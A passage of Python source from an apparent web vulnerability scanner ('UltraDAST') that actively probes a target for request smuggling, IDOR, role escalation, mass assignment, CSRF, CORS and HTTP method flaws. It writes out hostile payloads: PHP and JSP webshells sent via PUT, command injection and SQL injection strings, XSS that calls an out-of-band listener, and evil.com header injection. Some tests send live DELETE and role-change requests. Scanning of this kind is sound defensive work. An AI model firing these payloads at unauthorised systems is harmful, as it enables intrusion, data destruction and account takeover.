                # Some succeeded, some failed with out of stock - lock is working
                logging.info(f"[INVENTORY OVERSELL] Lock appears atomic: {success_count} succeeded, {len(out_of_stock_errors)} failed with 'Out of Stock'")
            elif success_count > 1:
                # Multiple succeeded but no clear out of stock message - potential issue
                await self._add_vulnerability({
                    "type": "Potential Inventory Oversell",
                    "url": purchase_url,
                    "parameter": "product_id,quantity",
                    "evidence": f"{success_count} concurrent requests succeeded without clear inventory lock failure",
                    "severity": "High",
                    "confidence": 70,
                    "cwe": "CWE-362"
                })
            
            return {
                "total_requests": 50,
                "successful": success_count,
                "failed": fail_count,
                "avg_response_time": avg_response_time,
                "max_response_time": max_response_time,
                "out_of_stock_errors": len(out_of_stock_errors),
                "results": results
            }
        except Exception as e:
            logging.warning(f"Inventory oversell test error: {e}")
    # --- Request Smuggling ---
    async def request_smuggling_tests(self):
        for scheme, header_map in PAYLOADS["RequestSmuggling"].items():
            try:
                # Use raw TCP to avoid aiohttp header normalization
                parsed = urlparse(self.target)
                host = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                is_ssl = parsed.scheme == 'https'
                
                # Construct raw HTTP request with smuggling headers
                headers_str = '\r\n'.join(f"{k}: {v}" for k, v in header_map.items())
                
                # CL.0: Send GET with Content-Length: 0 to bypass Frontend -> Backend
                if scheme == "CL.0":
                    raw_request = f"GET / HTTP/1.1\r\nHost: {host}\r\n{headers_str}\r\n\r\n"
                else:
                    raw_request = f"POST / HTTP/1.1\r\nHost: {host}\r\n{headers_str}\r\nContent-Length: 4\r\n\r\n0\r\n\r\n"
                
                if is_ssl:
                    import ssl
                    ssl_context = create_ssl_context(verify=False)
                    reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context)
                else:
                    reader, writer = await asyncio.open_connection(host, port)
                
                writer.write(raw_request.encode())
                await writer.drain()
                
                # Read response
                response = await asyncio.wait_for(reader.read(4096), timeout=5)
                writer.close()
                await writer.wait_closed()
                
                response_str = response.decode('utf-8', errors='ignore')
                if 'error' in response_str.lower() or response_str.startswith('HTTP/1.1 400') or response_str.startswith('HTTP/1.1 500'):
                    await self._add_vulnerability({
                        "type":"Request Smuggling","url":self.target,"parameter":"*",
                        "evidence":f"{scheme} caused internal error or bad request",
                        "severity":"Critical","confidence":80,"cwe":CWE_MAP["RequestSmuggling"]
                    })
                # CL.0 specific: Check if backend processed request differently than frontend
                if scheme == "CL.0" and response_str.startswith('HTTP/1.1 200'):
                    await self._add_vulnerability({
                        "type":"CL.0 Bypass","url":self.target,"parameter":"*",
                        "evidence":"GET with Content-Length: 0 accepted - potential Frontend->Backend bypass",
                        "severity":"High","confidence":75,"cwe":CWE_MAP["RequestSmuggling"]
                    })
            except Exception as e:
                logging.warning(f"Request smuggling test error: {e}")

    # --- HTTP/2 Downgrade ---
    async def http2_downgrade_tests(self):
        """Test HTTP/2 downgrade with malformed headers"""
        try:
            # First check if target supports HTTP/2
            parsed = urlparse(self.target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            is_ssl = parsed.scheme == 'https'
            
            # Try to detect HTTP/2 support via ALPN
            http2_supported = False
            if is_ssl:
                try:
                    import ssl
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                    ssl_context.set_alpn_protocols(['h2', 'http/1.1'])
                    
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port, ssl=ssl_context),
                        timeout=5
                    )
                    http2_supported = writer.get_extra_info('ssl_object').selected_alpn_protocol() == 'h2'
                    writer.close()
                    await writer.wait_closed()
                except Exception as e:
                    logging.debug(f"HTTP/2 detection via ALPN failed: {e}")
            
            if not http2_supported:
                logging.info("Target does not support HTTP/2, skipping HTTP/2 downgrade tests")
                return
            
            logging.info(f"Target supports HTTP/2, testing HTTP/2 downgrade attacks")
            
            # Test 1: HTTP/2 downgrade with malformed headers
            malformed_headers = [
                "X-Forwarded-For: \r\nGET /admin HTTP/1.1\r\nHost: evil.com",
                "X-Original-URL: \r\n\r\nGET / HTTP/1.1",
                "X-Rewrite-URL: /../../etc/passwd",
                "Forwarded: for=192.168.1.1;proto=http;host=internal",
                "X-Forwarded-Host: internal.admin",
                "X-Forwarded-Proto: http",
            ]
            
            for header in malformed_headers:
                try:
                    if is_ssl:
                        import ssl
                        ssl_context = create_ssl_context(verify=False)
                        reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context)
                    else:
                        reader, writer = await asyncio.open_connection(host, port)
                    
                    # Send HTTP/1.1 request with malformed headers (simulating downgrade)
                    raw_request = f"GET / HTTP/1.1\r\nHost: {host}\r\n{header}\r\n\r\n"
                    writer.write(raw_request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(4096), timeout=5)
                    writer.close()
                    await writer.wait_closed()
                    
                    response_str = response.decode('utf-8', errors='ignore')
                    
                    # Check for successful response or interesting behavior
                    if response_str.startswith('HTTP/1.1 200') or 'admin' in response_str.lower() or 'internal' in response_str.lower():
                        await self._add_vulnerability({
                            "type":"HTTP/2 Downgrade","url":self.target,"parameter":"*",
                            "evidence":f"Malformed header accepted during HTTP/2 downgrade: {header[:50]}",
                            "severity":"High","confidence":70,"cwe":"CWE-444"
                        })
                        break  # One successful test is enough
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    logging.debug(f"HTTP/2 downgrade test error for header {header[:30]}: {e}")
            
            # Test 2: HTTP/2 to HTTP/1.1 protocol confusion
            try:
                if is_ssl:
                    import ssl
                    ssl_context = create_ssl_context(verify=False)
                    reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context)
                else:
                    reader, writer = await asyncio.open_connection(host, port)
                
                # Send request with HTTP/2-style pseudo-headers in HTTP/1.1
                raw_request = f"GET / HTTP/1.1\r\nHost: {host}\r\n:method: GET\r\n:path: /\r\n:scheme: https\r\n\r\n"
                writer.write(raw_request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(4096), timeout=5)
                writer.close()
                await writer.wait_closed()
                
                response_str = response.decode('utf-8', errors='ignore')
                if response_str.startswith('HTTP/1.1 200'):
                    await self._add_vulnerability({
                        "type":"HTTP/2 Protocol Confusion","url":self.target,"parameter":"*",
                        "evidence":"HTTP/2 pseudo-headers accepted in HTTP/1.1 request",
                        "severity":"Medium","confidence":65,"cwe":"CWE-444"
                    })
            except Exception as e:
                logging.debug(f"HTTP/2 protocol confusion test error: {e}")
                
        except Exception as e:
            logging.warning(f"HTTP/2 downgrade test error: {e}")

    # --- IDOR ---
    async def run_idor_tests(self):
        for url in self.crawler_engine.visited_urls:
            # Numeric ID in path
            for match in re.finditer(r'/(\d+)', urlparse(url).path):
                uid = match.group(1)
                try:
                    new_id = str(int(uid) + 1)
                    new_url = url[:match.start(1)] + new_id + url[match.end(1):]
                    if new_url in self.crawler_engine.visited_urls: continue
                    resp_orig = await self._async_fetch(url)
                    resp_new = await self._async_fetch(new_url)
                    if resp_new and resp_new.status == 200 and len(resp_new._body) > 100:
                        if resp_orig and self.token_normalizer.normalize(resp_new._body) != self.token_normalizer.normalize(resp_orig._body):
                            await self._add_vulnerability({
                                "type":"IDOR","url":url,"parameter":f"ID {uid}",
                                "evidence":"Access to different ID returned different content",
                                "severity":"High","confidence":85,"cwe":CWE_MAP["IDOR"]
                            })
                except Exception as e:
                    logging.warning(f"IDOR test error: {e}")
            # UUID
            uuid_pattern = r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
            for match in re.finditer(uuid_pattern, url, re.I):
                new_uuid = str(uuid.uuid4())
                new_url = url[:match.start()] + new_uuid + url[match.end():]
                if new_url in self.crawler_engine.visited_urls: continue
                resp_new = await self._async_fetch(new_url)
                if resp_new and resp_new.status == 200 and len(resp_new._body) > 100:
                    await self._add_vulnerability({
                        "type":"IDOR (UUID)","url":url,"parameter":"UUID",
                        "evidence":"Access with different UUID returned content",
                        "severity":"High","confidence":80,"cwe":CWE_MAP["IDOR"]
                    })
            # Parameter-based ID
            for param in self.crawler_engine.parameters:
                if param['url'] == url and param['method'] == 'POST' and re.search(r'id$|user|account|profile', param['param'], re.I):
                    pname = param['param']
                    resp_base = await self._async_fetch(url, method='POST', data={pname: '1'})
                    if resp_base:
                        resp_test = await self._async_fetch(url, method='POST', data={pname: '9999'})
                        if resp_test and resp_test.status == 200 and self.token_normalizer.normalize(resp_test._body) != self.token_normalizer.normalize(resp_base._body):
                            await self._add_vulnerability({
                                "type":"IDOR (Param)","url":url,"parameter":pname,
                                "evidence":"Parameter change gave different response",
                                "severity":"High","confidence":60,"cwe":CWE_MAP["IDOR"]
                            })

    async def test_org_user_id_mismatch(self):
        """Test for ORG_ID vs USER_ID MISMATCH - Organization boundary bypass"""
        self.log("Testing ORG_ID vs USER_ID mismatch...")
        for url in self.crawler_engine.visited_urls:
            if self.stop_event.is_set():
                break
            # Look for endpoints with both org_id and user_id parameters
            for param in self.crawler_engine.parameters:
                if param['url'] == url and 'org_id' in param['param'].lower():
                    # Try to swap org_id while keeping user_id from different org
                    base_resp = await self._async_fetch(url, method=param['method'], 
                                                       data={param['param']: '1', 'user_id': '2'} 
                                                       if param['method'] == 'POST' else None)
                    if not base_resp:
                        continue
                    # Test with different org_id but same user_id
                    test_resp = await self._async_fetch(url, method=param['method'],
                                                        data={param['param']: '2', 'user_id': '1'}
                                                        if param['method'] == 'POST' else None)
                    if test_resp and test_resp.status == 200:
                        if base_resp and self.token_normalizer.normalize(test_resp._body) != self.token_normalizer.normalize(base_resp._body):
                            await self._add_vulnerability({
                                "type":"IDOR (Org-User Mismatch)","url":url,"parameter":param['param'],
                                "evidence":"Organization boundary bypass - different org_id returned data",
                                "severity":"Critical","confidence":85,"cwe":CWE_MAP["IDOR"]
                            })

    async def test_role_hierarchy_escalation(self):
        """Test for ROLE HIERARCHY ESCALATION - Role modification abuse"""
        self.log("Testing role hierarchy escalation...")
        for url in self.crawler_engine.visited_urls:
            if self.stop_event.is_set():
                break
            # Look for role modification endpoints
            if re.search(r'/users/[^/]+/role|/role|/permissions', url, re.I):
                for param in self.crawler_engine.parameters:
                    if param['url'] == url and 'role' in param['param'].lower():
                        # Try escalating from lower to higher privilege
                        role_payloads = [
                            {'role': 'admin'},
                            {'role': 'superadmin'},
                            {'role': 'owner'},
                            {'permissions': ['admin', 'write', 'delete']}
                        ]
                        for payload in role_payloads:
                            test_resp = await self._async_fetch(url, method='PATCH' if param['method'] in ['PUT', 'PATCH'] else 'POST',
                                                                json_data=payload if param['type'] == 'json' else None,
                                                                data=payload if param['type'] != 'json' else None)
                            if test_resp and test_resp.status in [200, 201, 202]:
                                if any(ind in test_resp._body.lower() for ind in ['admin', 'success', 'updated', 'granted']):
                                    await self._add_vulnerability({
                                        "type":"IDOR (Role Escalation)","url":url,"parameter":param['param'],
                                        "evidence":f"Role escalation succeeded - payload: {payload}",
                                        "severity":"Critical","confidence":80,"cwe":CWE_MAP["IDOR"]
                                    })
                                    break

    async def test_array_bulk_idor(self):
        """Test for ARRAY-BASED BULK IDOR - Mass assignment with unrelated IDs"""
        self.log("Testing array-based bulk IDOR...")
        for param in self.crawler_engine.parameters:
            if param['method'] != 'POST':
                continue
            if 'ids' in param['param'].lower() or re.search(r'id\[\]|list.*id', param['param'], re.I):
                url = param['url']
                # Test with array containing unrelated IDs
                bulk_payloads = [
                    {'ids': [1, 2, 9999]},
                    {'ids': [1, 99999, 2]},
                    {'user_ids': [1, 2, 9999]},
                    {'items': [1, 2, 9999]}
                ]
                for payload in bulk_payloads:
                    test_resp = await self._async_fetch(url, method='POST',
                                                        json_data=payload if param['type'] == 'json' else None,
                                                        data=payload if param['type'] != 'json' else None)
                    if test_resp and test_resp.status == 200:
                        # Check if response contains data for all IDs including the unrelated one
                        if any(str(id) in test_resp._body for id in [9999, 99999]):
                            await self._add_vulnerability({
                                "type":"IDOR (Bulk Array)","url":url,"parameter":param['param'],
                                "evidence":f"Mass assignment returned data for unrelated IDs - payload: {payload}",
                                "severity":"Critical","confidence":90,"cwe":CWE_MAP["IDOR"]
                            })
                            break

    # --- Mass Assignment ---
    async def run_mass_assignment_tests(self):
        for param in self.crawler_engine.parameters:
            if param['method'] != 'POST': continue
            url = param['url']; pname = param['param']; ptype = param['type']
            if ptype != 'json':
                base_resp = await self._async_fetch(url, method='POST', data={pname:'test'})
            else:
                base_resp = await self._async_fetch(url, method='POST', json_data={pname:'test'})
            if not base_resp: continue
            base_text = self.token_normalizer.normalize(base_resp._body)
            for extra_set in PAYLOADS.get("MassAssignment", []):
                if isinstance(extra_set, dict):
                    if ptype == 'json':
                        json_data = {pname:'test'}
                        json_data.update(extra_set)
                        resp = await self._async_fetch(url, method='POST', json_data=json_data)
                    else:
                        data = {pname:'test'}
                        data.update(extra_set)
                        resp = await self._async_fetch(url, method='POST', data=data)
                    if resp and self.token_normalizer.normalize(resp._body) != base_text:
                        if any(ind in resp._body.lower() for ind in ['admin','role','access','success','welcome','dashboard']):
                            await self._add_vulnerability({
                                "type":"MassAssignment","url":url,"parameter":pname,
                                "evidence":f"Extra fields {list(extra_set.keys())} changed response",
                                "severity":"High","confidence":75,"cwe":CWE_MAP["MassAssignment"]
                            })
                            break

    # --- CSRF ---
    async def run_csrf_checks(self):
        for page in self.crawler_engine.crawled_pages:
            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
            if not page_data:
                continue
            html = page_data.get('html_content', '')
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                form_text = form.get_text().lower()
                if any(w in form_text for w in ['delete','remove','logout','reset','wipe']):
                    continue
                action = urljoin(page['url'], form.get('action',''))
                # Get fresh page to extract CSRF token
                page_resp = await self._async_fetch(page['url'])
                if page_resp:
                    page_soup = BeautifulSoup(page_resp._body, 'html.parser')
                    csrf_token = None
                    for inp in page_soup.find_all('input', attrs={'name': re.compile(r'csrf|token|nonce', re.I)}):
                        csrf_token = inp.get('value')
                    data = {}
                    for inp in form.find_all(['input','textarea','select']):
                        name = inp.get('name')
                        if name:
                            data[name] = inp.get('value','test')
                    resp = await self._async_fetch(action, method='POST', data=data)
                    if resp and resp.status not in (403,401) and 'invalid' not in resp._body.lower():
                        await self._add_vulnerability({
                            "type":"CSRF Confirmed","url":page['url'],"parameter":"form",
                            "evidence":"POST succeeded without CSRF token",
                            "severity":"High","confidence":90,"cwe":CWE_MAP["CSRF"]
                        })

    # --- CORS with credentials ---
    async def run_cors_checks(self):
        for url in self.crawler_engine.visited_urls:
            for origin in ["null", "https://evil.com"]:
                headers = {"Origin": origin}
                resp = await self._async_fetch(url, method='OPTIONS', headers=headers)
                if resp and 'Access-Control-Allow-Origin' in resp.headers:
                    acao = resp.headers['Access-Control-Allow-Origin']
                    if acao == origin or acao == '*':
                        # Test with credentials via JS
                        if self.selenium_ready:
                            script = f"""
                            var callback = arguments[0];
                            fetch('{url}', {{method:'GET',credentials:'include',headers:{{'Origin':'{origin}'}}}})
                                .then(r => r.text()).then(body => callback('SUCCESS:' + body.substring(0,50)))
                                .catch(e => callback('ERROR:' + e.toString()));
                            """
                            result = await self.loop.run_in_executor(None, self.selenium_driver.execute_js, script)
                            if result and 'SUCCESS' in result:
                                await self._add_vulnerability({
                                    "type":"CORS (Credentialed)","url":url,
                                    "evidence":f"Origin {origin} allowed with credentials",
                                    "severity":"High","confidence":85,"cwe":CWE_MAP["CORS"]
                                })
                            else:
                                await self._add_vulnerability({
                                    "type":"CORS Misconfiguration","url":url,"evidence":f"ACAO: {acao}",
                                    "severity":"Medium","confidence":70,"cwe":CWE_MAP["CORS"]
                                })

    # ---------------------------------------------------------------------
    # HTTP METHOD VULNERABILITY TESTS
    # ---------------------------------------------------------------------
    async def run_http_method_tests(self):
        """Comprehensive HTTP method vulnerability testing"""
        self.log("Starting HTTP method vulnerability tests...")
        
        # Test URLs from crawled pages
        test_urls = list(self.crawler_engine.visited_urls)[:20]  # Limit to first 20 URLs for efficiency
        
        for url in test_urls:
            if self.stop_event.is_set():
                break
                
            # Test each HTTP method
            await self._test_put_method(url)
            await self._test_patch_method(url)
            await self._test_post_method(url)
            await self._test_get_method(url)
            await self._test_delete_method(url)
            await self._test_options_method(url)
            
            self.current_task += 1
            self.update_progress(self.current_task, self.total_tasks)
    
    async def _test_put_method(self, url):
        """Test PUT method vulnerabilities"""
        try:
            # Get baseline response
            baseline_resp = await self._async_fetch(url, method='GET')
            
            # Test file upload payload
            file_payloads = [
                '<?php system($_GET["cmd"]); ?>',  # PHP webshell
                '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',  # JSP webshell
                'DB_PASSWORD=secret123',  # Sensitive config
                'test_file_upload.txt',  # Generic file
            ]
            
            for payload in file_payloads:
                if self.stop_event.is_set():
                    break
                    
                marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
                test_payload = f"{marker}_{payload}"
                
                resp = await self._async_fetch(url, method='PUT', data=test_payload)
                if resp:
                    result = Detector.put_file_upload(resp, baseline_resp, url, test_payload)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
                    
                    result = Detector.put_resource_overwrite(resp, baseline_resp, url)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
                    
                    # Check OOB callbacks
                    await asyncio.sleep(0.3)
                    with oob_results_lock:
                        for res in oob_results:
                            if marker in res['path']:
                                await self._add_vulnerability({
                                    "type": "PUT OOB Callback",
                                    "confidence": 95,
                                    "evidence": f"OOB callback: {res['path']}",
                                    "url": url,
                                    "severity": "High"
                                })
                                break
        except Exception as e:
            logging.warning(f"PUT method test error for {url}: {e}")
    
    async def _test_patch_method(self, url):
        """Test PATCH method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            
            # Test mass assignment payloads
            mass_assignment_payloads = [
                '{"is_admin": true, "role": "administrator"}',
                '{"permissions": ["all", "admin", "superuser"]}',
                '{"access_level": 99, "is_superuser": true}',
            ]
            
            for payload in mass_assignment_payloads:
                if self.stop_event.is_set():
                    break
                    
                try:
                    json_data = json.loads(payload)
                except json.JSONDecodeError:
                    # Fallback to URL-encoded data if JSON parsing fails
                    json_data = None
                    resp = await self._async_fetch(url, method='PATCH', data=payload)
                else:
                    resp = await self._async_fetch(url, method='PATCH', json_data=json_data)
                
                if resp:
                    result = Detector.patch_mass_assignment(resp, baseline_resp, payload)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": payload})
            
            # Test validation bypass payloads
            validation_payloads = [
                '{"email": "invalid-email-no-at-sign"}',
                '{"age": -999, "quantity": 999999}',
                '{"username": "admin\' OR 1=1--"}',
            ]
            
            for payload in validation_payloads:
                if self.stop_event.is_set():
                    break
                    
                try:
                    json_data = json.loads(payload)
                except json.JSONDecodeError:
                    # Fallback to URL-encoded data if JSON parsing fails
                    json_data = None
                    resp = await self._async_fetch(url, method='PATCH', data=payload)
                else:
                    resp = await self._async_fetch(url, method='PATCH', json_data=json_data)
                    
                if resp:
                    result = Detector.patch_validation_bypass(resp, baseline_resp, payload)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": payload})
                        
        except Exception as e:
            logging.warning(f"PATCH method test error for {url}: {e}")
    
    async def _test_post_method(self, url):
        """Test POST method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            
            # Test stored XSS payloads
            xss_payloads = [
                '<script>alert(document.domain)</script>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
            ]
            
            for payload in xss_payloads:
                if self.stop_event.is_set():
                    break
                    
                marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
                oob_url = f"http://{self.public_ip}:{self.oob_port}/{marker}"
                test_payload = payload.replace('alert(1)', f'fetch("{oob_url}")')
                
                resp = await self._async_fetch(url, method='POST', data={'test': test_payload})
                if resp:
                    result = Detector.post_stored_xss(resp, baseline_resp, test_payload, oob_results, marker)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
            
            # Test authentication bypass
            auth_payloads = [
                {'username': '', 'password': ''},
                {'username': 'admin', 'password': ''},
                {'user': 'admin', 'pass': 'any'},
            ]
            
            for payload in auth_payloads:
                if self.stop_event.is_set():
                    break
                    
                resp = await self._async_fetch(url, method='POST', data=payload)
                if resp:
                    result = Detector.post_auth_bypass(resp, baseline_resp, url)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": str(payload)})
            
            # Test command injection
            cmd_payloads = [
                ';id',
                '|whoami',
                '&&dir',
                '||ping -c 1 127.0.0.1',
            ]
            
            for payload in cmd_payloads:
                if self.stop_event.is_set():
                    break
                    
                resp = await self._async_fetch(url, method='POST', data={'cmd': payload})
                if resp:
                    result = Detector.post_command_injection(resp, baseline_resp, payload)
                    if result:
                        await self._add_vulnerability({**result, "url": url, "payload": payload})
                        
        except Exception as e:
            logging.warning(f"POST method test error for {url}: {e}")
    
    async def _test_get_method(self, url):
        """Test GET method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            
            # Test IDOR by manipulating IDs in URL
            id_pattern = re.search(r'/(\d+)', url)
            if id_pattern:
                original_id = id_pattern.group(1)
                test_ids = [str(int(original_id) + 1), str(int(original_id) - 1), '99999']
                
                for test_id in test_ids:
                    if self.stop_event.is_set():
                        break
                        
                    test_url = url.replace(f'/{original_id}', f'/{test_id}')
                    resp = await self._async_fetch(test_url, method='GET')
                    if resp:
                        result = Detector.get_idor(resp, baseline_resp, test_url, test_id)
                        if result:
                            await self._add_vulnerability({**result, "url": test_url})
            
            # Test parameter pollution
            parsed = urlparse(url)
            if parsed.query:
                # Add duplicate parameters
                params = parse_qs(parsed.query)
                polluted_params = []
                for key, values in params.items():
                    polluted_params.append((key, values[0]))
                    polluted_params.append((key, 'polluted_value'))
                
                polluted_url = urlunparse(parsed._replace(query=urlencode(polluted_params, doseq=True)))
                resp = await self._async_fetch(polluted_url, method='GET')
                if resp:
                    result = Detector.get_parameter_pollution(resp, baseline_resp, polluted_url)
                    if result:
                        await self._add_vulnerability({**result, "url": polluted_url})
            
            # Test cache poisoning potential
            result = Detector.get_cache_poisoning(baseline_resp, None, url)
            if result:
                await self._add_vulnerability({**result, "url": url})
                
        except Exception as e:
            logging.warning(f"GET method test error for {url}: {e}")
    
    async def _test_delete_method(self, url):
        """Test DELETE method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            
            # Test unauthorized deletion
            resp = await self._async_fetch(url, method='DELETE')
            if resp:
                result = Detector.delete_unauthorized(resp, baseline_resp, url)
                if result:
                    await self._add_vulnerability({**result, "url": url})
            
            # Test DELETE IDOR
            id_pattern = re.search(r'/(\d+)', url)
            if id_pattern:
                original_id = id_pattern.group(1)
                test_id = str(int(original_id) + 1)
                test_url = url.replace(f'/{original_id}', f'/{test_id}')
                
                resp = await self._async_fetch(test_url, method='DELETE')
                if resp:
                    result = Detector.delete_idor(resp, baseline_resp, test_url, test_id)
                    if result:
                        await self._add_vulnerability({**result, "url": test_url})
            
            # Test cascading deletion
            if resp:
                result = Detector.delete_cascading(resp, baseline_resp, url)
                if result:
                    await self._add_vulnerability({**result, "url": url})
                    
        except Exception as e:
            logging.warning(f"DELETE method test error for {url}: {e}")
    
    async def _test_options_method(self, url):
        """Test OPTIONS method vulnerabilities"""
        try:
            baseline_resp = await self._async_fetch(url, method='GET')
            
            # Test OPTIONS method
            resp = await self._async_fetch(url, method='OPTIONS')
            if resp:
                result = Detector.options_info_disclosure(resp, baseline_resp, url)
                if result:
                    await self._add_vulnerability({**result, "url": url})
                
                result = Detector.options_method_tampering(resp, baseline_resp, url)
                if result:
                    await self._add_vulnerability({**result, "url": url})
                    
        except Exception as e:
            logging.warning(f"OPTIONS method test error for {url}: {e}")

    # --- CVSS and reporting ---
    def calculate_cvss(self, vuln):
        if not CVSS_AVAILABLE:
            return None
        try:
            vector = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
            c = CVSS4(vector)
            return c.score
        except Exception as e:
            logging.warning(f"CVSS calculation error: {e}")
            return None

    def export_burp_xml(self, report):
        xml = '<?xml version="1.0"?>\n<issues>\n'
        for vuln in report['vulnerabilities']:
            xml += f"""<issue>
    <serialNumber>{vuln.get('id','')}</serialNumber>
    <type>{vuln['type']}</type>
    <name>{vuln['type']}</name>
    <host ip="unknown">{urlparse(vuln['url']).hostname}</host>
    <path>{urlparse(vuln['url']).path}</path>
    <location>{vuln['url']}</location>
    <severity>{vuln['severity']}</severity>
    <confidence>{vuln['confidence']}</confidence>
    <issueDetail>{vuln.get('evidence','')}</issueDetail>
</issue>\n"""
        xml += '</issues>'
        return xml

    async def send_jira_alert(self, vuln):
        jira_url = self.config.get('jira_webhook')
        if jira_url:
            try:
                if self.session_manager and self.session_manager.async_session:
                    # Reuse existing connection pool
                    async with self.session_manager.async_session.session.request('POST', jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)}) as resp:
                        if resp.status == 200:
                            self.log(f"JIRA alert sent for {vuln['type']}")
                else:
                    # Fallback to new session
                    async with aiohttp.ClientSession() as session:
                        await session.post(jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)})
                        self.log(f"JIRA alert sent for {vuln['type']}")
            except Exception as e:
                self.log(f"Failed to send JIRA alert: {e}")

    async def send_slack_alert(self, vuln):
        slack_url = self.config.get('slack_webhook')
        if slack_url:
            try:
                if self.session_manager and self.session_manager.async_session:
                    # Reuse existing connection pool
                    async with self.session_manager.async_session.session.request('POST', slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"}) as resp:
                        if resp.status == 200:
                            self.log(f"Slack alert sent for {vuln['type']}")
                else:
                    # Fallback to new session
                    async with aiohttp.ClientSession() as session:
                        await session.post(slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"})
                        self.log(f"Slack alert sent for {vuln['type']}")
            except Exception as e:
                self.log(f"Failed to send Slack alert: {e}")

    async def _add_vulnerability(self, vuln):
        if await self.fp_db.is_fp(vuln):
            return
        conf = vuln.get('confidence', 0)
        if conf < self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
            return
        
        # Normalize and fill all required fields with meaningful defaults
        vuln.setdefault('subtype', 'General')
        vuln.setdefault('method', 'POST' if vuln.get('payload') else 'GET')
        vuln.setdefault('parameter', vuln.get('parameter', 'N/A'))
        vuln.setdefault('severity', vuln.get('severity', 'Medium'))
        vuln.setdefault('confidence', vuln.get('confidence', 50))
        vuln.setdefault('cwe', vuln.get('cwe', 'CWE-200'))
        vuln.setdefault('evidence', vuln.get('evidence', 'Security issue detected'))
        vuln.setdefault('full_evidence', vuln.get('full_evidence', vuln.get('evidence', 'Security issue detected')))
        vuln.setdefault('payload', vuln.get('payload', 'N/A'))
        vuln.setdefault('response', vuln.get('response', 'Response data not captured'))
        vuln.setdefault('request_headers', vuln.get('request_headers', {}))
        vuln.setdefault('response_headers', vuln.get('response_headers', {}))
        vuln.setdefault('status_code', vuln.get('status_code', 'N/A'))
        vuln.setdefault('cvss_score', vuln.get('cvss_score'))
        vuln.setdefault('cvss_vector', vuln.get('cvss_vector'))
        vuln.setdefault('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        vuln.setdefault('tags', vuln.get('tags', ['security', 'vulnerability']))
        vuln.setdefault('description', vuln.get('description', f'{vuln.get("type")} vulnerability detected at {vuln.get("url")}'))
        vuln.setdefault('remediation', vuln.get('remediation', 'Review and fix the identified security issue'))
        vuln.setdefault('references', vuln.get('references', []))
        
        # Apply confidence decay for temporal recheck
        vuln_key = (vuln['type'], vuln['url'], vuln.get('parameter', ''))
        if vuln_key in self.vulnerability_timestamps:
            elapsed = time.time() - self.vulnerability_timestamps[vuln_key]
            decay_factor = max(0.5, 1 - (elapsed / self.recheck_delay))
            vuln['confidence'] = int(vuln['confidence'] * decay_factor)
            vuln['original_confidence'] = vuln.get('confidence')
            vuln['decay_applied'] = True
        else:
            self.vulnerability_timestamps[vuln_key] = time.time()
        
        # Perform 3x validation if enabled and vulnerability type is supported
        if self.validation_enabled and self.validation_engine:
            vuln_type = vuln.get('type', '')
            # Only validate XSS and SQLi vulnerabilities for now
            if 'XSS' in vuln_type or 'SQLi' in vuln_type:
                try:
                    # Schedule async validation and store task to prevent garbage collection
                    task = asyncio.create_task(self._validate_vulnerability(vuln))
                    self.validation_tasks.add(task)
                    task.add_done_callback(self.validation_tasks.discard)
                    # Add vulnerability with pending validation status
                    vuln['validation_pending'] = True
                    self.log(f"[VALIDATING] {vuln['type']} ({vuln.get('confidence')}%): {vuln['url']} [{vuln.get('parameter','')}]")
                except Exception as e:
                    logging.error(f"Validation scheduling failed: {e}")
        
        # Generate PoC for the vulnerability
        if self.config.get('generate_pocs', True):
            pocs = ExploitPoCGenerator.generate_all_pocs(vuln)
            vuln['poc_curl'] = pocs['curl']
            vuln['poc_python'] = pocs['python']
        
        for v in self.reporting_engine.vulnerabilities:
            if v['type']==vuln['type'] and v['url']==vuln['url'] and v.get('parameter')==vuln.get('parameter'):
                if vuln['confidence'] > v['confidence']:
                    v.update(vuln)
                return
        self.reporting_engine.vulnerabilities.append(vuln)
        self.log(f"[+] {vuln['type']} ({vuln.get('confidence')}%): {vuln['url']} [{vuln.get('parameter','')}]")
        self.add_finding(vuln)
        if vuln.get('severity') in ('Critical','High'):
            asyncio.ensure_future(self.send_slack_alert(vuln))
            asyncio.ensure_future(self.send_jira_alert(vuln))
    
